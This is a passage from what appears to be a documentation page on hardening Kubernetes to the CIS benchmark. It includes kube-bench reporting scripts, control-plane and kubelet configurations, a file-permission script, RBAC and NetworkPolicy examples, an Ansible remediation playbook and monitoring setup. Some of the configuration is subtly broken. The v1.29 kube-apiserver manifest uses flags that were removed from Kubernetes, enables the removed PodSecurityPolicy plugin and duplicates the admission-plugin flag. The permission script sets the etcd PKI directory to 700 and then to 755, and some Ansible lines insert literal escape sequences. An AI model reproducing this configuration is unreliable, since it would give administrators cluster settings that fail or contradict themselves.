\"${RESULTS_FILE}\" | jq '.Totals.total_pass')\nTOTAL_FAIL=$(cat \"${RESULTS_FILE}\" | jq '.Totals.total_fail')\nTOTAL_WARN=$(cat \"${RESULTS_FILE}\" | jq '.Totals.total_warn')\nTOTAL_INFO=$(cat \"${RESULTS_FILE}\" | jq '.Totals.total_info')\n\nCOMPLIANCE_SCORE=$(echo \"scale=2; ${TOTAL_PASS} / (${TOTAL_PASS} + ${TOTAL_FAIL}) * 100\" | bc)\n\necho \"Compliance Score: ${COMPLIANCE_SCORE}%\"\necho \"Pass: ${TOTAL_PASS} | Fail: ${TOTAL_FAIL} | Warn: ${TOTAL_WARN} | Info: ${TOTAL_INFO}\"\n\n# Failed checks by severity\necho -e \"\\n[2] CRITICAL FAILURES (FAIL):\"\ncat \"${RESULTS_FILE}\" | jq -r '.Controls[].tests[] |\n  select(.results[].status == \"FAIL\") |\n  .results[] |\n  select(.status == \"FAIL\") |\n  \"\\(.test_number) - \\(.test_desc)\"' | head -20\n\n# Warnings\necho -e \"\\n[3] WARNINGS:\"\ncat \"${RESULTS_FILE}\" | jq -r '.Controls[].tests[] |\n  select(.results[].status == \"WARN\") |\n  .results[] |\n  select(.status == \"WARN\") |\n  \"\\(.test_number) - \\(.test_desc)\"' | head -10\n\n# Remediation suggestions\necho -e \"\\n[4] REMEDIATION ACTIONS:\"\ncat \"${RESULTS_FILE}\" | jq -r '.Controls[].tests[].results[] |\n  select(.status == \"FAIL\") |\n  \"\\(.test_number): \\(.remediation)\"' | head -10\n\n# Group by section\necho -e \"\\n[5] FAILURES BY SECTION:\"\nfor section in \"1.2 API Server\" \"1.3 Controller Manager\" \"1.4 Scheduler\" \"2 etcd\" \"3 Control Plane Configuration\" \"4 Worker Nodes\" \"5 Policies\"; do\n  count=$(cat \"${RESULTS_FILE}\" | jq -r --arg sect \"$section\" '.Controls[] |\n    select(.text | contains($sect)) |\n    .tests[].results[] |\n    select(.status == \"FAIL\")' | wc -l)\n  echo \"${section}: ${count} failures\"\ndone\n\n# Generate HTML report\necho -e \"\\n[6] Generating HTML report...\"\ncat \"${RESULTS_FILE}\" | jq -r '\n  \"&lt;html&gt;&lt;head&gt;&lt;title&gt;CIS Benchmark Report&lt;/title&gt;&lt;style&gt;\n    body { font-family: Arial, sans-serif; margin: 20px; }\n    .pass { color: green; }\n    .fail { color: red; font-weight: bold; }\n    .warn { color: orange; }\n    table { border-collapse: collapse; width: 100%; }\n    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }\n    th { background-color: #4CAF50; color: white; }\n  &lt;/style&gt;&lt;/head&gt;&lt;body&gt;\n  &lt;h1&gt;CIS Kubernetes Benchmark Report&lt;/h1&gt;\n  &lt;h2&gt;Summary&lt;/h2&gt;\n  &lt;p&gt;Compliance Score: \" + (.Totals.total_pass / (.Totals.total_pass + .Totals.total_fail) * 100 | tostring) + \"%&lt;/p&gt;\n  &lt;table&gt;\n    &lt;tr&gt;&lt;th&gt;Status&lt;/th&gt;&lt;th&gt;Count&lt;/th&gt;&lt;/tr&gt;\n    &lt;tr&gt;&lt;td class=\\\"pass\\\"&gt;Pass&lt;/td&gt;&lt;td&gt;\" + (.Totals.total_pass | tostring) + \"&lt;/td&gt;&lt;/tr&gt;\n    &lt;tr&gt;&lt;td class=\\\"fail\\\"&gt;Fail&lt;/td&gt;&lt;td&gt;\" + (.Totals.total_fail | tostring) + \"&lt;/td&gt;&lt;/tr&gt;\n    &lt;tr&gt;&lt;td class=\\\"warn\\\"&gt;Warn&lt;/td&gt;&lt;td&gt;\" + (.Totals.total_warn | tostring) + \"&lt;/td&gt;&lt;/tr&gt;\n    &lt;tr&gt;&lt;td&gt;Info&lt;/td&gt;&lt;td&gt;\" + (.Totals.total_info | tostring) + \"&lt;/td&gt;&lt;/tr&gt;\n  &lt;/table&gt;\n  &lt;h2&gt;Failed Checks&lt;/h2&gt;\n  &lt;table&gt;&lt;tr&gt;&lt;th&gt;Check&lt;/th&gt;&lt;th&gt;Description&lt;/th&gt;&lt;th&gt;Remediation&lt;/th&gt;&lt;/tr&gt;\" +\n  (.Controls[].tests[].results[] | select(.status == \"FAIL\") |\n    \"&lt;tr&gt;&lt;td&gt;\" + .test_number + \"&lt;/td&gt;&lt;td&gt;\" + .test_desc + \"&lt;/td&gt;&lt;td&gt;\" + .remediation + \"&lt;/td&gt;&lt;/tr&gt;\") +\n  \"&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;\"\n' &gt; cis-report.html\n\necho \"HTML report generated: cis-report.html\"\n</code></pre>"},{"location":"13-cis-compliance/#3-control-plane-security-requirements","title":"3. Control Plane Security Requirements","text":""},{"location":"13-cis-compliance/#31-api-server-hardening-cis-section-12","title":"3.1 API Server Hardening (CIS Section 1.2)","text":"<p>Critical API Server Flags:</p> <pre><code># /etc/kubernetes/manifests/kube-apiserver.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    image: registry.k8s.io/kube-apiserver:v1.29.0\n    command:\n    - kube-apiserver\n\n    # 1.2.1 - Disable anonymous authentication\n    - --anonymous-auth=false\n\n    # 1.2.2 - Use token authentication file (if applicable)\n    # - --token-auth-file=/path/to/tokens.csv\n\n    # 1.2.3 - Use HTTPS for kubelet connections\n    - --kubelet-https=true\n\n    # 1.2.4 - Enable kubelet client certificate authentication\n    - --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt\n    - --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key\n\n    # 1.2.5 - Verify kubelet certificates\n    - --kubelet-certificate-authority=/etc/kubernetes/pki/ca.crt\n\n    # 1.2.6 - Ensure authorization mode includes Node\n    - --authorization-mode=Node,RBAC\n\n    # 1.2.7 - Ensure admission control plugins are configured\n    - --enable-admission-plugins=NodeRestriction,PodSecurityPolicy,ServiceAccount,NamespaceLifecycle,LimitRanger,ResourceQuota\n\n    # 1.2.8 - Disable AlwaysAdmit admission controller\n    # (Ensure AlwaysAdmit is NOT in enable-admission-plugins)\n\n    # 1.2.9 - Ensure AlwaysPullImages is enabled\n    - --enable-admission-plugins=AlwaysPullImages,NodeRestriction,PodSecurityPolicy\n\n    # 1.2.10 - Disable insecure port\n    - --insecure-port=0\n\n    # 1.2.11 - Secure port configuration\n    - --secure-port=6443\n\n    # 1.2.12 - Ensure profiling is disabled\n    - --profiling=false\n\n    # 1.2.13 - Ensure repair-malformed-updates is disabled\n    - --repair-malformed-updates=false\n\n    # 1.2.14 - Ensure service account lookup is enabled\n    - --service-account-lookup=true\n\n    # 1.2.15 - Ensure service account key file is configured\n    - --service-account-key-file=/etc/kubernetes/pki/sa.pub\n\n    # 1.2.16 - Ensure service account signing key file is configured\n    - --service-account-signing-key-file=/etc/kubernetes/pki/sa.key\n\n    # 1.2.17 - Ensure etcd certfile and keyfile are configured\n    - --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt\n    - --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key\n\n    # 1.2.18 - Ensure TLS configuration\n    - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt\n    - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key\n\n    # 1.2.19 - Ensure client CA is configured\n    - --client-ca-file=/etc/kubernetes/pki/ca.crt\n\n    # 1.2.20 - Ensure etcd CA is configured\n    - --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt\n\n    # 1.2.21 - Ensure encryption at rest\n    - --encryption-provider-config=/etc/kubernetes/encryption-config.yaml\n\n    # 1.2.22 - Ensure audit logging is configured\n    - --audit-log-path=/var/log/kubernetes/audit.log\n    - --audit-log-maxage=30\n    - --audit-log-maxbackup=10\n    - --audit-log-maxsize=100\n    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml\n\n    # 1.2.23 - Ensure audit log maxage is 30 or greater\n    # (Covered above)\n\n    # 1.2.24 - Ensure audit log maxbackup is 10 or greater\n    # (Covered above)\n\n    # 1.2.25 - Ensure audit log maxsize is 100 or greater\n    # (Covered above)\n\n    # 1.2.26 - Ensure request timeout is appropriate\n    - --request-timeout=60s\n\n    # 1.2.27 - Ensure service account issuer is configured\n    - --service-account-issuer=https://kubernetes.default.svc.cluster.local\n\n    # 1.2.28 - Ensure API audiences are configured\n    - --api-audiences=https://kubernetes.default.svc.cluster.local\n\n    # 1.2.29 - Ensure TLS minimum version\n    - --tls-min-version=VersionTLS13\n\n    # 1.2.30 - Ensure TLS cipher suites\n    - --tls-cipher-suites=TLS_AES_128_GCM_SHA256,TLS_AES_256_GCM_SHA384,TLS_CHACHA20_POLY1305_SHA256\n\n    volumeMounts:\n    - mountPath: /etc/kubernetes/pki\n      name: k8s-certs\n      readOnly: true\n    - mountPath: /etc/kubernetes\n      name: k8s-config\n      readOnly: true\n    - mountPath: /var/log/kubernetes\n      name: audit-log\n</code></pre>"},{"location":"13-cis-compliance/#32-controller-manager-hardening-cis-section-13","title":"3.2 Controller Manager Hardening (CIS Section 1.3)","text":"<pre><code># /etc/kubernetes/manifests/kube-controller-manager.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-controller-manager\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-controller-manager\n    command:\n    - kube-controller-manager\n\n    # 1.3.1 - Ensure --terminated-pod-gc-threshold is set\n    - --terminated-pod-gc-threshold=1000\n\n    # 1.3.2 - Ensure profiling is disabled\n    - --profiling=false\n\n    # 1.3.3 - Ensure use-service-account-credentials is enabled\n    - --use-service-account-credentials=true\n\n    # 1.3.4 - Ensure service account private key file is configured\n    - --service-account-private-key-file=/etc/kubernetes/pki/sa.key\n\n    # 1.3.5 - Ensure root CA file is configured\n    - --root-ca-file=/etc/kubernetes/pki/ca.crt\n\n    # 1.3.6 - Ensure RotateKubeletServerCertificate is enabled\n    - --feature-gates=RotateKubeletServerCertificate=true\n\n    # 1.3.7 - Ensure bind address is set to 127.0.0.1\n    - --bind-address=127.0.0.1\n</code></pre>"},{"location":"13-cis-compliance/#33-scheduler-hardening-cis-section-14","title":"3.3 Scheduler Hardening (CIS Section 1.4)","text":"<pre><code># /etc/kubernetes/manifests/kube-scheduler.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-scheduler\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-scheduler\n    command:\n    - kube-scheduler\n\n    # 1.4.1 - Ensure profiling is disabled\n    - --profiling=false\n\n    # 1.4.2 - Ensure bind address is set to 127.0.0.1\n    - --bind-address=127.0.0.1\n</code></pre>"},{"location":"13-cis-compliance/#34-file-permissions-cis-section-11","title":"3.4 File Permissions (CIS Section 1.1)","text":"<pre><code>#!/bin/bash\n# fix-file-permissions.sh\n\necho \"=== Fixing CIS File Permissions ===\"\n\n# 1.1.1 - Master node configuration files ownership\nchown root:root /etc/kubernetes/manifests/*.yaml\nchmod 644 /etc/kubernetes/manifests/*.yaml\n\n# 1.1.2 - API server pod specification file permissions\nchmod 600 /etc/kubernetes/manifests/kube-apiserver.yaml\n\n# 1.1.3 - Controller manager pod specification\nchmod 600 /etc/kubernetes/manifests/kube-controller-manager.yaml\n\n# 1.1.4 - Scheduler pod specification\nchmod 600 /etc/kubernetes/manifests/kube-scheduler.yaml\n\n# 1.1.5 - etcd pod specification\nchmod 600 /etc/kubernetes/manifests/etcd.yaml\n\n# 1.1.6 - Ensure CNI files permissions\nchmod 644 /etc/cni/net.d/*\nchown root:root /etc/cni/net.d/*\n\n# 1.1.7 - Ensure etcd data directory permissions\nchmod 700 /var/lib/etcd\nchown etcd:etcd /var/lib/etcd\n\n# 1.1.8 - Ensure admin.conf permissions\nchmod 600 /etc/kubernetes/admin.conf\nchown root:root /etc/kubernetes/admin.conf\n\n# 1.1.9 - Ensure scheduler.conf permissions\nchmod 600 /etc/kubernetes/scheduler.conf\nchown root:root /etc/kubernetes/scheduler.conf\n\n# 1.1.10 - Ensure controller-manager.conf permissions\nchmod 600 /etc/kubernetes/controller-manager.conf\nchown root:root /etc/kubernetes/controller-manager.conf\n\n# 1.1.11 - Ensure etcd data directory ownership\nfind /var/lib/etcd -type d -exec chmod 700 {} \\;\nfind /var/lib/etcd -exec chown etcd:etcd {} \\;\n\n# 1.1.12 - Ensure etcd PKI directory permissions\nchmod 700 /etc/kubernetes/pki/etcd\nchown root:root /etc/kubernetes/pki/etcd\nfind /etc/kubernetes/pki/etcd -type f -name \"*.crt\" -exec chmod 644 {} \\;\nfind /etc/kubernetes/pki/etcd -type f -name \"*.key\" -exec chmod 600 {} \\;\n\n# 1.1.13 - Ensure admin kubeconfig permissions\nchmod 600 /etc/kubernetes/admin.conf\n\n# 1.1.14 - Ensure kubelet kubeconfig permissions\nchmod 600 /etc/kubernetes/kubelet.conf\nchown root:root /etc/kubernetes/kubelet.conf\n\n# 1.1.15 - Ensure kubelet config.yaml permissions\nchmod 600 /var/lib/kubelet/config.yaml\nchown root:root /var/lib/kubelet/config.yaml\n\n# 1.1.16 - Ensure PKI directory and file ownership\nchown -R root:root /etc/kubernetes/pki/\nfind /etc/kubernetes/pki/ -name \"*.crt\" -exec chmod 644 {} \\;\nfind /etc/kubernetes/pki/ -name \"*.key\" -exec chmod 600 {} \\;\n\n# 1.1.17 - Ensure PKI key file permissions\nfind /etc/kubernetes/pki/ -name \"*.key\" -exec chmod 600 {} \\;\n\n# 1.1.18 - Ensure PKI certificate file permissions\nfind /etc/kubernetes/pki/ -name \"*.crt\" -exec chmod 644 {} \\;\n\n# 1.1.19 - Ensure PKI directory permissions\nchmod 755 /etc/kubernetes/pki\nchmod 755 /etc/kubernetes/pki/etcd\n\n# 1.1.20 - Ensure kubeconfig file ownership\nfind /etc/kubernetes -name \"*.conf\" -exec chown root:root {} \\;\nfind /etc/kubernetes -name \"*.conf\" -exec chmod 600 {} \\;\n\n# 1.1.21 - Ensure kubelet.conf ownership and permissions\nchown root:root /etc/kubernetes/kubelet.conf\nchmod 600 /etc/kubernetes/kubelet.conf\n\necho \"=== File permissions fixed ===\"\n</code></pre>"},{"location":"13-cis-compliance/#4-worker-node-security-requirements","title":"4. Worker Node Security Requirements","text":""},{"location":"13-cis-compliance/#41-kubelet-configuration-cis-section-42","title":"4.1 Kubelet Configuration (CIS Section 4.2)","text":"<pre><code># /var/lib/kubelet/config.yaml\napiVersion: kubelet.config.k8s.io/v1beta1\nkind: KubeletConfiguration\n\n# 4.2.1 - Ensure anonymous authentication is disabled\nauthentication:\n  anonymous:\n    enabled: false\n  webhook:\n    enabled: true\n    cacheTTL: 2m\n  x509:\n    clientCAFile: /etc/kubernetes/pki/ca.crt\n\n# 4.2.2 - Ensure authorization mode is not AlwaysAllow\nauthorization:\n  mode: Webhook\n  webhook:\n    cacheAuthorizedTTL: 5m\n    cacheUnauthorizedTTL: 30s\n\n# 4.2.3 - Ensure client CA file is configured\n# (Covered above in authentication.x509.clientCAFile)\n\n# 4.2.4 - Ensure read-only port is disabled\nreadOnlyPort: 0\n\n# 4.2.5 - Ensure streaming connection idle timeout is configured\nstreamingConnectionIdleTimeout: 5m\n\n# 4.2.6 - Ensure protect kernel defaults\nprotectKernelDefaults: true\n\n# 4.2.7 - Ensure make-iptables-util-chains is enabled\nmakeIPTablesUtilChains: true\n\n# 4.2.8 - Ensure eventRecordQPS is configured\neventRecordQPS: 5\n\n# 4.2.9 - TLS configuration\ntlsCertFile: /var/lib/kubelet/pki/kubelet.crt\ntlsPrivateKeyFile: /var/lib/kubelet/pki/kubelet.key\ntlsMinVersion: VersionTLS13\ntlsCipherSuites:\n  - TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256\n  - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\n  - TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\n\n# 4.2.10 - Ensure certificate rotation\nrotateCertificates: true\nserverTLSBootstrap: true\n\n# 4.2.11 - Ensure RotateKubeletServerCertificate is enabled\nfeatureGates:\n  RotateKubeletServerCertificate: true\n  SeccompDefault: true\n\n# 4.2.12 - Ensure kubelet only pulls authenticated images\n# (Implemented via AlwaysPullImages admission controller)\n\n# 4.2.13 - Ensure kubelet hostname override\n# (Do not set hostname-override)\n\n# Resource management\ncgroupDriver: systemd\nsystemReserved:\n  cpu: 200m\n  memory: 512Mi\n  ephemeral-storage: 1Gi\nkubeReserved:\n  cpu: 200m\n  memory: 512Mi\n  ephemeral-storage: 1Gi\nenforceNodeAllocatable:\n  - pods\n  - system-reserved\n  - kube-reserved\n\n# Eviction policies\nevictionHard:\n  memory.available: \"100Mi\"\n  nodefs.available: \"10%\"\n  nodefs.inodesFree: \"5%\"\nevictionSoft:\n  memory.available: \"200Mi\"\n  nodefs.available: \"15%\"\nevictionSoftGracePeriod:\n  memory.available: \"1m\"\n  nodefs.available: \"2m\"\n</code></pre>"},{"location":"13-cis-compliance/#42-kubelet-service-configuration","title":"4.2 Kubelet Service Configuration","text":"<pre><code># /etc/systemd/system/kubelet.service.d/10-kubeadm.conf\n[Service]\nEnvironment=\"KUBELET_EXTRA_ARGS=--protect-kernel-defaults=true --tls-cipher-suites=TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\"\n\nExecStart=\nExecStart=/usr/bin/kubelet \\\n  --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf \\\n  --kubeconfig=/etc/kubernetes/kubelet.conf \\\n  --config=/var/lib/kubelet/config.yaml \\\n  --container-runtime-endpoint=unix:///var/run/containerd/containerd.sock \\\n  --pod-infra-container-image=registry.k8s.io/pause:3.9\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>"},{"location":"13-cis-compliance/#5-policies-section","title":"5. Policies Section","text":""},{"location":"13-cis-compliance/#51-rbac-best-practices-cis-section-51","title":"5.1 RBAC Best Practices (CIS Section 5.1)","text":"<p>5.1.1 - Minimize use of cluster-admin role:</p> <pre><code># Audit cluster-admin usage\nkubectl get clusterrolebindings -o json | \\\n  jq -r '.items[] | select(.roleRef.name==\"cluster-admin\") |\n  \"\\(.metadata.name): \\(.subjects[]?.name)\"'\n\n# Should only be emergency break-glass accounts\n</code></pre> <p>5.1.2 - Minimize wildcard use in RBAC:</p> <pre><code># Find overly permissive roles\nkubectl get roles,clusterroles --all-namespaces -o json | \\\n  jq -r '.items[] | select(.rules[]?.verbs[]? == \"*\" or .rules[]?.resources[]? == \"*\") |\n  \"\\(.metadata.namespace // \"cluster\")/\\(.metadata.name)\"'\n</code></pre> <p>5.1.3 - Service Account Tokens:</p> <pre><code># Disable automounting for service accounts that don't need it\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: my-app\n  namespace: production\nautomountServiceAccountToken: false\n---\n# Or at pod level\napiVersion: v1\nkind: Pod\nmetadata:\n  name: my-app\nspec:\n  serviceAccountName: my-app\n  automountServiceAccountToken: false\n  containers:\n  - name: app\n    image: my-app:v1.0.0\n</code></pre>"},{"location":"13-cis-compliance/#52-pod-security-standards-cis-section-52","title":"5.2 Pod Security Standards (CIS Section 5.2)","text":"<p>Enforce Restricted Pod Security Standard:</p> <pre><code># Pod Security Admission configuration\napiVersion: apiserver.config.k8s.io/v1\nkind: AdmissionConfiguration\nplugins:\n- name: PodSecurity\n  configuration:\n    apiVersion: pod-security.admission.config.k8s.io/v1\n    kind: PodSecurityConfiguration\n    defaults:\n      enforce: \"restricted\"\n      enforce-version: \"latest\"\n      audit: \"restricted\"\n      audit-version: \"latest\"\n      warn: \"restricted\"\n      warn-version: \"latest\"\n    exemptions:\n      usernames: []\n      runtimeClasses: []\n      namespaces: [kube-system]\n</code></pre> <p>Namespace-level Pod Security:</p> <pre><code>apiVersion: v1\nkind: Namespace\nmetadata:\n  name: production\n  labels:\n    pod-security.kubernetes.io/enforce: restricted\n    pod-security.kubernetes.io/audit: restricted\n    pod-security.kubernetes.io/warn: restricted\n</code></pre>"},{"location":"13-cis-compliance/#53-network-policies-cis-section-53","title":"5.3 Network Policies (CIS Section 5.3)","text":"<p>5.3.1 - Default deny all traffic:</p> <pre><code># Default deny all ingress and egress\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-all\n  namespace: production\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress\n</code></pre> <p>5.3.2 - Allow only necessary traffic:</p> <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-app-traffic\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      app: web\n  policyTypes:\n  - Ingress\n  - Egress\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          app: frontend\n    ports:\n    - protocol: TCP\n      port: 8080\n  egress:\n  - to:\n    - podSelector:\n        matchLabels:\n          app: database\n    ports:\n    - protocol: TCP\n      port: 5432\n  # Allow DNS\n  - to:\n    - namespaceSelector:\n        matchLabels:\n          name: kube-system\n    ports:\n    - protocol: UDP\n      port: 53\n</code></pre>"},{"location":"13-cis-compliance/#54-secrets-management-cis-section-54","title":"5.4 Secrets Management (CIS Section 5.4)","text":"<p>5.4.1 - Use external secrets management:</p> <pre><code># External Secrets Operator example\napiVersion: external-secrets.io/v1beta1\nkind: SecretStore\nmetadata:\n  name: vault-backend\n  namespace: production\nspec:\n  provider:\n    vault:\n      server: \"https://vault.example.com\"\n      path: \"secret\"\n      version: \"v2\"\n      auth:\n        kubernetes:\n          mountPath: \"kubernetes\"\n          role: \"production-role\"\n          serviceAccountRef:\n            name: external-secrets\n---\napiVersion: external-secrets.io/v1beta1\nkind: ExternalSecret\nmetadata:\n  name: app-secrets\n  namespace: production\nspec:\n  refreshInterval: 15m\n  secretStoreRef:\n    name: vault-backend\n    kind: SecretStore\n  target:\n    name: app-secrets\n    creationPolicy: Owner\n  data:\n  - secretKey: database-password\n    remoteRef:\n      key: production/database\n      property: password\n</code></pre>"},{"location":"13-cis-compliance/#6-automated-remediation","title":"6. Automated Remediation","text":""},{"location":"13-cis-compliance/#61-compliance-automation-workflow","title":"6.1 Compliance Automation Workflow","text":"<pre><code>graph LR\n    A[Code Commit] --&gt; B[CI Pipeline]\n    B --&gt; C[kube-bench Scan]\n    C --&gt; D{Pass?}\n    D --&gt;|No| E[Auto-Remediation]\n    D --&gt;|Yes| F[Deploy to Staging]\n    E --&gt; G[Apply Ansible Playbook]\n    G --&gt; H[Rerun kube-bench]\n    H --&gt; I{Pass?}\n    I --&gt;|Yes| F\n    I --&gt;|No| J[Create Ticket]\n    J --&gt; K[Manual Review]\n    F --&gt; L[Production Deploy]\n    L --&gt; M[Continuous Monitoring]\n    M --&gt; N[Daily kube-bench CronJob]\n    N --&gt; O{Compliance OK?}\n    O --&gt;|No| P[Alert Team]\n    O --&gt;|Yes| M\n\n    style C fill:#4ecdc4\n    style E fill:#ff6b6b\n    style M fill:#ffe66d</code></pre>"},{"location":"13-cis-compliance/#62-ansible-remediation-playbook","title":"6.2 Ansible Remediation Playbook","text":"<pre><code># cis-remediation.yml\n---\n- name: CIS Kubernetes Benchmark Remediation\n  hosts: k8s_masters:k8s_workers\n  become: yes\n  tasks:\n    - name: Fix API Server Configuration\n      when: \"'k8s_masters' in group_names\"\n      block:\n        - name: Ensure API server pod manifest has correct permissions\n          file:\n            path: /etc/kubernetes/manifests/kube-apiserver.yaml\n            owner: root\n            group: root\n            mode: '0600'\n\n        - name: Update API server flags\n          lineinfile:\n            path: /etc/kubernetes/manifests/kube-apiserver.yaml\n            regexp: '{{ item.regexp }}'\n            line: '{{ item.line }}'\n            state: present\n          loop:\n            - { regexp: '.*--anonymous-auth.*', line: '    - --anonymous-auth=false' }\n            - { regexp: '.*--profiling.*', line: '    - --profiling=false' }\n            - { regexp: '.*--insecure-port.*', line: '    - --insecure-port=0' }\n          notify: restart kubelet\n\n    - name: Fix etcd Configuration\n      when: \"'k8s_masters' in group_names\"\n      block:\n        - name: Ensure etcd data directory permissions\n          file:\n            path: /var/lib/etcd\n            owner: etcd\n            group: etcd\n            mode: '0700'\n            state: directory\n\n        - name: Ensure etcd PKI permissions\n          file:\n            path: /etc/kubernetes/pki/etcd\n            owner: root\n            group: root\n            mode: '0700'\n            state: directory\n\n    - name: Fix Kubelet Configuration\n      block:\n        - name: Ensure kubelet config file exists\n          template:\n            src: kubelet-config.yaml.j2\n            dest: /var/lib/kubelet/config.yaml\n            owner: root\n            group: root\n            mode: '0600'\n          notify: restart kubelet\n\n        - name: Disable anonymous auth in kubelet\n          lineinfile:\n            path: /var/lib/kubelet/config.yaml\n            regexp: '.*anonymous:.*'\n            line: '  anonymous:\\n    enabled: false'\n            state: present\n          notify: restart kubelet\n\n        - name: Set kubelet authorization mode\n          lineinfile:\n            path: /var/lib/kubelet/config.yaml\n            regexp: '.*mode:.*'\n            line: '  mode: Webhook'\n            state: present\n          notify: restart kubelet\n\n    - name: Apply sysctl hardening\n      sysctl:\n        name: '{{ item.name }}'\n        value: '{{ item.value }}'\n        state: present\n        reload: yes\n      loop:\n        - { name: 'kernel.kptr_restrict', value: '2' }\n        - { name: 'kernel.dmesg_restrict', value: '1' }\n        - { name: 'net.ipv4.conf.all.rp_filter', value: '1' }\n        - { name: 'net.ipv4.conf.all.accept_source_route', value: '0' }\n\n    - name: Ensure compliance monitoring\n      cron:\n        name: \"Daily kube-bench scan\"\n        minute: \"0\"\n        hour: \"2\"\n        job: \"/usr/local/bin/kube-bench run --json &gt; /var/log/kube-bench-$(date +\\\\%Y\\\\%m\\\\%d).json\"\n        user: root\n\n  handlers:\n    - name: restart kubelet\n      systemd:\n        name: kubelet\n        state: restarted\n        daemon_reload: yes\n</code></pre>"},{"location":"13-cis-compliance/#63-gitops-based-compliance","title":"6.3 GitOps-based Compliance","text":"<p>Flux Kustomization with CIS Compliance:</p> <pre><code># compliance/kustomization.yaml\napiVersion: kustomize.config.k8s.io/v1beta1\nkind: Kustomization\n\nresources:\n  - namespace.yaml\n  - pod-security-standards.yaml\n  - network-policies.yaml\n  - rbac.yaml\n\npatchesStrategicMerge:\n  - patches/api-server-flags.yaml\n  - patches/kubelet-config.yaml\n\nconfigurations:\n  - cis-compliance-config.yaml\n</code></pre>"},{"location":"13-cis-compliance/#7-compliance-reporting-and-dashboards","title":"7. Compliance Reporting and Dashboards","text":""},{"location":"13-cis-compliance/#71-prometheus-metrics","title":"7.1 Prometheus Metrics","text":"<p>kube-bench Exporter:</p> <pre><code># kube-bench-exporter.yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: kube-bench-exporter\n  namespace: monitoring\ndata:\n  exporter.sh: |\n    #!/bin/bash\n    while true; do\n      # Run kube-bench\n      kube-bench run --json &gt; /tmp/results.json\n\n      # Extract metrics\n      TOTAL_PASS=$(cat /tmp/results.json | jq '.Totals.total_pass')\n      TOTAL_FAIL=$(cat /tmp/results.json | jq '.Totals.total_fail')\n      TOTAL_WARN=$(cat /tmp/results.json | jq '.Totals.total_warn')\n      COMPLIANCE_SCORE=$(echo \"scale=2; $TOTAL_PASS / ($TOTAL_PASS + $TOTAL_FAIL) * 100\" | bc)\n\n      # Write metrics\n      cat &lt;&lt;EOF &gt; /metrics/kube-bench.prom\n# HELP kube_bench_compliance_score CIS compliance score percentage\n# TYPE kube_bench_compliance_score gauge\nkube_bench_compliance_score ${COMPLIANCE_SCORE}\n\n# HELP kube_bench_checks_total Total number of checks by status\n# TYPE kube_bench_checks_total gauge\nkube_bench_checks_total{status=\"pass\"} ${TOTAL_PASS}\nkube_bench_checks_total{status=\"fail\"} ${TOTAL_FAIL}\nkube_bench_checks_total{status=\"warn\"} ${TOTAL_WARN}\nEOF\n\n      sleep 3600  # Run hourly\n    done\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kube-bench-exporter\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kube-bench-exporter\n  template:\n    metadata:\n      labels:\n        app: kube-bench-exporter\n    spec:\n      serviceAccountName: kube-bench\n      containers:\n      - name: exporter\n        image: aquasec/kube-bench:latest\n        command: [\"/scripts/exporter.sh\"]\n        volumeMounts:\n        - name: scripts\n          mountPath: /scripts\n        - name: metrics\n          mountPath: /metrics\n      - name: metrics-server\n        image: nginx:alpine\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: metrics\n          mountPath: /usr/share/nginx/html\n      volumes:\n      - name: scripts\n        configMap:\n          name: kube-bench-exporter\n          defaultMode: 0755\n      - name: metrics\n        emptyDir: {}\n</code></pre>"},{"location":"13-cis-compliance/#72-grafana-dashboard","title":"7.2 Grafana Dashboard","text":"<p>Dashboard JSON (excerpt):</p> <pre><code>{\n  \"dashboard\": {\n    \"title\": \"CIS Kubernetes Compliance\",\n    \"panels\": [\n      {\n        \"title\": \"Compliance Score\",\n        \"targets\": [\n          {\n            \"expr\": \"kube_bench_compliance_score\"\n          }\n        ],\n        \"type\": \"gauge\",\n        \"options\": {\n          \"thresholds\": [\n            { \"value\": 0, \"color\": \"red\" },\n            { \"value\": 70, \"color\": \"yellow\" },\n            { \"value\": 90, \"color\": \"green\" }\n          ]\n        }\n      },\n      {\n        \"title\": \"Failed Checks Over Time\",\n        \"targets\": [\n          {\n            \"expr\": \"kube_bench_checks_total{status=\\\"fail\\\"}\"\n          }\n        ],\n        \"type\": \"graph\"\n      },\n      {\n        \"title\": \"Checks by Status\",\n        \"targets\": [\n          {\n            \"expr\": \"kube_bench_checks_total\"\n          }\n        ],\n        \"type\": \"piechart\"\n      }\n    ]\n  }\n}\n</code></pre>"},{"location":"13-cis-compliance/#summary","title":"Summary","text":"<p>This module covered:</p> <ol> 